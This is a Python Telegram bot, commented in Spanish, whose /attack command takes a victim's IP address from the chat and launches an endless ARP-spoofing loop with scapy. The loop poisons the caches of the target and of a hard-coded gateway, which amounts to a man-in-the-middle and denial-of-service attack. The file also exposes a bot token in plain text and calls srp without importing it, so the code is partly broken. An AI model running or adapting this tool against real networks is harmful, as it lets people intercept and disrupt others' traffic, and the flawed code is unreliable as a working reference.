import logging
import os
import threading
import time

from telegram import ReplyKeyboardMarkup
from telegram.ext import CommandHandler, ConversationHandler, MessageHandler, Updater
from scapy.all import ARP, Ether, send

a = 1

IP = range(1)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)

logger = logging.getLogger(__name__)

def start(update, context):
    """Comando /start"""

    update.message.reply_text('Hola, usa /help para ver los comandos disponibles')


def help(update, context):
    """Comando /help"""

    update.message.reply_text('Los comandos disponibles son los siguientes:')
    update.message.reply_text('')
    update.message.reply_text('/start')
    update.message.reply_text('/help')
    update.message.reply_text('/attack')

def attack(update, context):
    """Realiza ARP Spoofing y DoS"""

    reply_keyboard = [['/cancel']]
    update.message.reply_text(
        '¿Cuál es la dirección IP de su víctima? (Escriba "/cancel" para cancelar la petición)',
        reply_markup=ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True),
    )

    return IP


def set_ip(update, context):
    """Recibe la IP de la víctima"""

    ip = update.message.text

    # Realizar ARP Spoofing
    gateway_ip = "192.168.75.1"
    gateway_mac = "00:50:56:C0:00:08"
    
    target_ip = ip
    target_mac = "00:0C:29:A0:F7:39"

    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    for sent, received in result:
        target_mac = received.hwsrc

    while True:
      
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac))

        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac))

        time.sleep(2)

    return ConversationHandler.END


def cancel(update, context):
    """Cancela la petición actual"""

    update.message.reply_text('Operación cancelada')

    return ConversationHandler.END


conv_handler = ConversationHandler(
    entry_points=[CommandHandler('attack', attack)],

    states={
        IP: [MessageHandler(None, set_ip)]
    },

    fallbacks=[MessageHandler(None, cancel)]
)

def main():
    """Se inicia el bot"""

    updater = Updater("6140799429:AAH3UwOcl4GlqqIy0oRKrTjbEfUAWWCicgU", use_context=True)

    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(conv_handler)
    updater.start_polling()

    updater.idle()

if __name__ == '__main__':
    main()
